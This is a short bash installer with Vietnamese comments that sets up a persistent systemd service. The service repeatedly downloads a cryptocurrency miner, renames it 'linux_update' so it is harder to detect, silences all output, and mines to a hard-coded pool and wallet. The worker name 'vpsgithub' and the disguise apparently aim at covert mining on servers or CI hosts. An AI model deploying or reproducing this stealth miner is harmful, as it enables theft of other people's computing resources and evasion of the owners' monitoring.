#!/bin/bash

# Tạo file dịch vụ systemd
create_systemd_service() {
  cat <<EOF | sudo tee /etc/systemd/system/my_miner.service
[Unit]
Description=My Miner Service
After=network.target

[Service]
ExecStart=/usr/local/bin/my_miner.sh
Restart=always
User=nobody
Group=nogroup
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
}

# Tạo script shell
create_shell_script() {
  cat <<'EOF' | sudo tee /usr/local/bin/my_miner.sh
#!/bin/bash

# Vòng lặp vô hạn để script chạy liên tục
while true; do
  # Tải file
  wget -q https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz

  # Giải nén file
  tar -xf hellminer_linux64_avx2.tar.gz
  rm -f hellminer_linux64_avx2.tar.gz

  # Đổi tên file để khó phát hiện hơn
  mv hellminer linux_update

  # Chạy chương trình trong 1 phút với tên đã đổi, ẩn danh và chạy ngầm
  nohup ./linux_update -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgithub --cpu 2 >/dev/null 2>&1 &
  miner_pid=$!
  sleep 1m

  # Dừng chương trình
  kill $miner_pid

  # Xóa các file đã tải và giải nén
  rm -f hellminer_linux64_avx2.tar.gz
  rm -rf linux_update

  # Nghỉ 1 phút trước khi lặp lại
  sleep 2m
done
EOF
  sudo chmod +x /usr/local/bin/my_miner.sh
}

# Tạo và khởi động dịch vụ
setup_service() {
  create_shell_script
  create_systemd_service
  sudo systemctl daemon-reload
  sudo systemctl start my_miner.service
  sudo systemctl enable my_miner.service
}

# Gọi hàm để thiết lập dịch vụ
setup_service

echo "Dịch vụ đã được cài đặt và khởi động thành công."
